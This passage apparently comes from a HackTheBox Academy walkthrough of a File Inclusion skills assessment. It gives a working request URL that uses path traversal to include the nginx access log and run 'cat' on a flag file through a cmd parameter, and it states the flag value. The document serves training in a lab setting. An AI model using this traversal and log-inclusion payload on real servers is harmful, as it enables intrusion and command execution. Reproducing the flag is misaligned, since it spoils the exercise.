Students will find the flag file with the name `flag_dacc60f2348d.txt`, therefore, students at last need to print its contents out, to attain the flag `a9a892dbc9faf9a014f58e007721835e`:

Skills Assessment - File Inclusion

```
http://STMIP:STMPO/ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt
```

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_27.png)